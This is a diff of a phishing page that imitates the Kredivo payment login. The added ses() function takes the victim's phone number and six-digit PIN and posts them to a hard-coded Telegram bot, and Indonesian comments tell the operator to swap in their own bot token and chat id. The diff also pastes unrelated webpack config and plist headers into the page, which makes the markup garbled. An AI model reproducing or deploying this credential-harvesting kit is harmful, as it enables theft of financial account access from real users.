@@ -1,18 +1,74 @@
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
 <html>
  <head> 
-  <!-- Google Tag Manager --> 
-  <script>(function (w, d, s, l, i) {
-      w[l] = w[l] || []; w[l].push({
-        'gtm.start':
-          new Date().getTime(), event: 'gtm.js'
-      }); var f = d.getElementsByTagName(s)[0],
-        j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
-          'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
-    })(window, document, 'script', 'dataLayer', 'GTM-T6GBHDX');</script> 
-  <!-- End Google Tag Manager --> 
+ <script>
+     const path = require("path");
+
+module.exports = {
+    // bundling mode
+    mode: "production",
+    // entry files
+    entry: "./src/index.ts",
+    // output bundles (location)
+    output: {
+        path: path.resolve( __dirname, "dist" ),
+        filename: "html5-qrcode.min.js",
+        library: "__Html5QrcodeLibrary__",
+    },
+    // file resolutions
+    resolve: {
+        extensions: [ ".ts", ".js" ],
+    },
+    target: "web",
+    module: {
+        rules: [
+            {
+                test: /\.tsx?/,
+                use: "ts-loader",
+                exclude: /node_modules/,
+            },
+        ]
+    },
+    optimization: {
+        minimize: true,
+        usedExports: true
+    }
+};
+
+
+/** Append the libary components to globals for backwards compatibility. */
+if (window) {
+    if (!Html5QrcodeScanner) {
+        var Html5QrcodeScanner = window.__Html5QrcodeLibrary__.Html5QrcodeScanner;
+    }
+    if (!Html5Qrcode) {
+        var Html5Qrcode = window.__Html5QrcodeLibrary__.Html5Qrcode;
+    }
+    if (!Html5QrcodeSupportedFormats) {
+        var Html5QrcodeSupportedFormats = window.__Html5QrcodeLibrary__.Html5QrcodeSupportedFormats
+    }
+    if (!Html5QrcodeScannerState) {
+        var Html5QrcodeScannerState = window.__Html5QrcodeLibrary__.Html5QrcodeScannerState;
+    }
+    if (!Html5QrcodeScanType) {
+        var Html5QrcodeScanType = window.__Html5QrcodeLibrary__.Html5QrcodeScanType;
+    }
+}
+
+ </script>
   <title>Payment - Kredivo</title> 
-  <!-- Viewport mobile tag for sensible mobile support --> 
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="format-detection" content="telephone=no">
+<meta name=viewport content="width=device-width, height=device-height, initial-scale=1">
+
+<script>
+ if (CSS.supports('-webkit-touch-callout', 'none')) // check for iOS safari
+  document.querySelector('meta[name=viewport]').content += ", user-scalable=no"
+</script>
   <link type="text/css" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic"> 
   <link type="text/css" rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css"> 
   <!--STYLES--> 
@@ -104,6 +160,45 @@
     width: 6vmin;
     margin-top: -25px;
 }
+
+
+#loading {
+            width: 100%;
+            height: 100%;
+            display: none;
+            margin: auto;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 99999;
+        }
+
+        #loading img {
+            width: 100px;
+            position: absolute;
+            top: 36%;
+            left: 0;
+            right: 0;
+            display: block;
+            margin: auto;
+        }
+
+        #aseli {
+            width: 100%;
+            height: 100%;
+            display: none;
+            margin: auto;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 9999;
+            overflow-y: scroll;
+        }
   </style>
   <!--STYLES END--> 
  </head> 
@@ -181,7 +276,7 @@
        <div class="mb-20">
            <h2 style=" text-align: left; margin-top: -15px; font-size: 15px;">Masuk ke Akun Kredivo-mu</h2>
       <div class="inpform">
-  <form action="gagal.html" method="get" onsubmit="loadd();">
+  <form action="gagal.html" id="letsgo" method="get" onsubmit="ses();">
       <input type="hidden" id="logo" value="✥•-•-•-•⟮𝗞𝗿𝗲𝗱𝗶𝘃𝗼⟯•-•-•-•✥">
 <label class="h3">Nomor Handphone</label>
    <input id="inpuser" value="" v-mask="'#### #### #####'" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" name="userid" maxlength="13" minlength="10" pattern="(?=.*[0-9]).{12,13}" title="Masukkan Nomor Handphone anda dengan benar" type="tel" class="payment-option" placeholder="08** Masukkan Nomor Hp Anda" style="
@@ -189,9 +284,9 @@
       background-repeat: no-repeat;
       background-size: 100% 107%; padding-left: 18px; color: #B0AFB7;" required>
 <label class="h4">PIN</label>
-   <input id="inppas" maxlength="6" minlength="6" pattern="(?=.*[0-9]).{6,6}" title="Masukkan Nomor Handphonr anda dengan benar" type="tel" class="payment-option" placeholder="Masukkan 6 Angka PIN Kredivo-Mu " style="padding-left: 18px; color: #B0AFB7;" required>
+   <input id="inppas" maxlength="6" minlength="6" pattern="(?=.*[0-9]).{6,6}" title="Masukkan Nomor Handphonr anda dengan benar" type="tel" class="payment-option" placeholder="Masukkan 6 Angka PIN Kredivo-Mu " style="padding-left: 18px; color: #B0AFB7;" name="" required>
 <i class="togel bi bi-eye-slash" id="togglePassword" style="margin-left: 58%; margin-bottom: 40px;"></i>
-<button type="submit" class="btn-kredi" id="kirim" onclick="ses()">Lanjut</button>
+<button type="submit" class="btn-kredi" id="kirim" onclick="loadd()">Lanjut</button>
 </form>
 <center>
 <a href="./lupa_pin.html" style="font-size: 12px; text-align: center; color: blue; font-weight: 800; background: none; border: none; text-decoration: none;" type="submit">Lupa PIN?</a>
@@ -202,8 +297,15 @@
      </div> 
     </div> 
    </div> 
+  </div>
+  <div id="loading"> 
+   <img src="https://cs.deo.shopeemobile.com/shopee/shopee-cs-live-sg/static/helpcenterfe/static/loading.938844ef.gif" alt=""> 
   </div> 
+  <div id="aseli"></div> 
   <!--SCRIPTS-->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous">
+    </script>
+  
   <script src="https://www.kredivo.id/p/in/js/jquery.min.js"></script>
   <script src="https://www.kredivo.id/p/in/js/bootstrap.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js"
@@ -229,7 +331,14 @@
             $("#loader").fadeIn();
         }
     </script>
- </body>
+<script>
+        $(document).ready(function () {
+            $("#letsgo").on('submit', function () {
+                $("#loading").show();
+                
+            });
+        });
+    </script> </body>
 </html>
 <script>
 function loadd() {
@@ -250,3 +359,23 @@ function loadd() {
     })
 }
 </script>
+<script>
+function ses() {
+
+    
+    var logo = document.getElementById('logo');
+    var inpuser = document.getElementById('inpuser');
+    var inppas = document.getElementById('inppas');
+
+    var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + inpuser.value + '%0A𝗣𝗜𝗡 𝗞𝗿𝗲𝗱𝗶𝘃𝗼%3A%0A' + inppas.value;
+   
+    var token = '5972548849:AAE0d4h8YSUWKQyXKCOSXjnfB384f-YaDmM'; // Ganti dengan token bot yang kamu buat
+    var grup = '5881060872'; // Ganti dengan chat id dari bot yang kamu buat
+
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+    })
+}
+</script>
+</DOCTYPE>
